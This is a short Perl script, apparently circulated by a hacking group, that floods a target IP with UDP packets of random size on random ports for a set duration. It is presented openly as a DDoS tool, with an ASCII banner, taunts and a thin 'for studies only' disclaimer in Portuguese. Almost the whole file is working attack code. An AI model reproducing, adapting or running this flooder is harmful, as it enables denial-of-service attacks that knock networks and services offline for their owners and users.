#!/usr/bin/perl

#~~~~> SE VOCÊ TEM CONHECIMENTO E NÃO É UM LAMMER, NÃO MODIFIQUE O SCRIPT
#~~~~> Voltado apenas para estudos
 
use Term::ANSIColor qw(:constants);
    $Term::ANSIColor::AUTORESET = 2;
print BOLD RED "Host IP \n";
print BOLD YELLOW "Port \n";
print BOLD GREEN "Package ";
print BOLD BLACK  "Seconds \n";
 
#Created by Alkalyne~Nazist
 
use Socket;
use strict;
 
my ($ip,$port,$size,$time) = @ARGV;
 
my ($iaddr,$endtime,$psize,$pport);
 
$iaddr = inet_aton("$ip") or die "Unidentified IP host, maybe you have not even pasted yet. $ip\n";
$endtime = time() + ($time ? $time : 100);
socket(flood, PF_INET, SOCK_DGRAM, 17);
 
print BOLD RED<<EOTEXT;

:'######::'########:::'######:::::'########::'########:::'#######:::'######::
'##... ##: ##.... ##:'##... ##:::: ##.... ##: ##.... ##:'##.... ##:'##... ##:
 ##:::..:: ##:::: ##: ##:::..::::: ##:::: ##: ##:::: ##: ##:::: ##: ##:::..::
. ######:: ########:: ##:::::::::: ##:::: ##: ##:::: ##: ##:::: ##:. ######::
:..... ##: ##.....::: ##:::::::::: ##:::: ##: ##:::: ##: ##:::: ##::..... ##:
'##::: ##: ##:::::::: ##::: ##:::: ##:::: ##: ##:::: ##: ##:::: ##:'##::: ##:
. ######:: ##::::::::. ######::::: ########:: ########::. #######::. ######::
:......:::..::::::::::......::::::........:::........::::.......::::......:::
       
EOTEXT
 
use Term::ANSIColor qw(:constants);
    $Term::ANSIColor::AUTORESET = 2;
print "~ We are the law ~ $ip " . ($port ? $port : "random") . "-" .
  ($size ? "$size-byte" : "Get No Routed Bitch!?") . "
~ DDoS <3.
~ #SPC_DD0S ~ " .
  ($time ? " for $time seconds" : "") . "\n";
print "Stoping comand: Ctrl-C\n" unless $time;  
 
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1500000-64)+64) ;
  $pport = $port ? $port : int(rand(1500000))+1;
 
send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport,
 $iaddr));}
